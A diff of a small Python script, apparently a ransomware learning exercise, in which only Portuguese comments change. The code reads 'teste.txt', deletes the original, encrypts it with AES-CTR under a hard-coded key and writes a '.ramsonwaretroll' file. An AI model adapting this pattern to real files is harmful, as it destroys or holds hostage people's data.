@@ -1,7 +1,7 @@
 import os
 import pyaes
 
-## abrir aquivo cripto
+## abrir aquivo original
 
 file_name = 'teste.txt'
 file = open(file_name, 'rb')
@@ -12,13 +12,13 @@ file.close()
 
 os.remove(file_name)
 
-## chave de cripto
+## chave descriptografica
 
 key = b"testeransomware"
 aes = pyaes.AESModeOfOperationCTR(key)
 encrypt_data = aes.encrypt(file_data)
 
-## cria novo arquivo encriptografado
+## cria novo arquivo criptografado
 
 new_file = file_name + '.ramsonwaretroll'
 new_file = open(f'{new_file}','wb')
